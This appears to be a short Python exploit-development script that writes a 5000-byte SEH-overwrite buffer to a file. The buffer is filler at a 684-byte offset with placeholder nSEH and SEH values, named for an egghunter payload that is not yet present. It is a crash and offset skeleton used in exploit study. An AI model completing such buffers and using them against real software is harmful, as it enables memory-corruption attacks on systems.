#!/usr/bin/python

file2="egghpayload.txt"

nSEH = "B" * 4
SEH  = "C" * 4

egghpayload  = "A" * 684
egghpayload += nSEH
egghpayload += SEH
egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

